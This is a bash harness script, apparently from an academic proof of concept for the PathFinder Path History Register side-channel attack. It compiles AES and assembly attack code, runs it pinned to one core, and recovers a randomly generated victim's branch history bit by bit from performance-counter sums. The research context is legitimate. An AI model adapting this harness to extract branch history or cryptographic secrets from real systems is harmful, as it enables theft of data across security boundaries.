# *****************************************
# CONFIDENTIAL SOURCE CODE, DO NOT DISTRIBUTE!
# IN SUBMISSION, ASPLOS 2024.
# *****************************************
#     Project:        PathFinder, PHR Attack Proof-of-Concept (PoC)
#     Author:         Hosein Yavarzadeh
#     Email:          hyavarzadeh@ucsd.edu
#     Affiliation:    University of California, San Diego (UCSD)
# *****************************************
#!/bin/bash

# Define assembler
ass=nasm

# Results directory
RESULTS_DIR="./results"

# Making required folders
if [ ! -d "./bin" ]; then
    mkdir "./bin"
fi
if [ ! -d "./results" ]; then
    mkdir "./results"
fi

# Clearing content of the Extracted PHR file
> $RESULTS_DIR/Extracted_PHR.csv

# Code to initialize environment variables inside test scripts
(cd .. && . vars.sh)

# Performance Counters
cts=207

# Initialize the PHR Model and the Victim PHR Model
for i in {0..193..1}
do
  PHR_Model[$i]=0
  Victim_PHR_Model[$i]=$(($RANDOM%4))
done
echo "${Victim_PHR_Model[@]}" > $RESULTS_DIR/Victim_PHR_Model.csv

# Compile Assembly file
$ass -g -f elf64 -o ./bin/b64.o -i../ -i./ -Dcounters=$cts -P./attack.nasm ../TemplateB64.nasm

# Compile c/cpp files
if [ ../PMCTestA.cpp -nt ./bin/a64.o ] ; then
  g++ -g -w -O2 -c -m64 -maes ../PMCTestA.cpp -o ./bin/a64.o
fi
if [ ../aes_core.c -nt ./bin/aes_core.o ] ; then
  gcc -g -w -O2 -c -m64 -maes ../aes_core.c -o ./bin/aes_core.o
fi
if [ ../aesni.c -nt ./bin/aesni.o ] ; then
  gcc -g -w -O2 -c -m64 -maes ../aesni.c -o ./bin/aesni.o
fi

# Intel-IPP library binary (This MUST be changed according to your library setup!)
# INTEL_IPP="/home/hyavarzadeh/Hosein/ipp-crypto/_build/.build/DEBUG/lib/libippcp.a"

# Linking object files
g++ -g -m64 -maes -lpthread ./bin/aesni.o ./bin/aes_core.o ./bin/a64.o ./bin/b64.o -o /tmp/x -static-libgcc -static-libstdc++ -lpthread # add "$INTEL_IPP" if you want to use Intel-IPP library
if [ $? -ne 0 ] ; then exit ; fi

# Dumping object files
# objdump -d /tmp/x > ./bin/attack_x_dump.asm

# Initialize an array for storing the sums
declare -a sum

# ********************************************************
# ********************* PHR Read Process *****************
# ********************************************************
for phr_bit in {193..0..1}
do
# --------------------------------------------------------
  extracted_bit=4
  while [[ $extracted_bit -eq 4 ]];
  do
    # ---- Trying 4 possible values of the PHR bit -------
    for i in {0..3..1}
    do
      # Set PHR bit
      PHR_Model[193]=$i

      # Running the actual test and capturing the output directly
      output=$(taskset -c 0 /tmp/x "$phr_bit" "${PHR_Model[@]}" "${Victim_PHR_Model[@]}")

      # Putting the results into "sum[0:3]" array
      sum[$i]=$(awk '{ sum += $1 } END { print sum }' <<< "$output")
      # echo ${sum[$i]}
    done

    # Analyzing the results
    index=("${!sum[@]}")
    sorted_indexes=($(for i in "${index[@]}"; do echo "${sum[i]} $i"; done | sort -n | awk '{print $2}'))
    sorted_array=($(for i in "${sorted_indexes[@]}"; do echo "${sum[i]}"; done))
    
    max_index=${sorted_indexes[3]}
    max_threshold=$(( ${sorted_array[3]} - ${sorted_array[2]} ))
    dist=$(( ${sorted_array[2]} - ${sorted_array[0]} ))

    if [ $max_threshold -gt 300 ]; then
      if [ $dist -lt 200 ]; then
        extracted_bit=$max_index
        index=$((193-$phr_bit))
        # echo -e "\e[1;34m PHR[$index] = $extracted_bit \e[0m"
        # echo -e "PHR[$index] = $extracted_bit" >> $RESULTS_DIR/Extracted_PHR.csv
      fi
    fi

  done
  # -------------------------------------------------------------------
  if [ $phr_bit -eq 0 ]; then
    PHR_Model[193]=$extracted_bit
    break
  fi
  # Modify the PHR Model
  start=$(($phr_bit-2))
  end=191
  for (( c=$start; c<=$end; c++ ))
  do
    j=$(($c+1))
    PHR_Model[$c]=${PHR_Model[$j]}
  done
  PHR_Model[192]=$extracted_bit
  PHR_Model[193]=0
# --------------------------------------------------------
done
# ********************************************************

# Save and show the extracted PHR!
echo -e "\e[1;32m PHR (lsb to msb):\e[0m ${PHR_Model[@]}"
echo ${PHR_Model[@]} >> $RESULTS_DIR/Extracted_PHR.csv
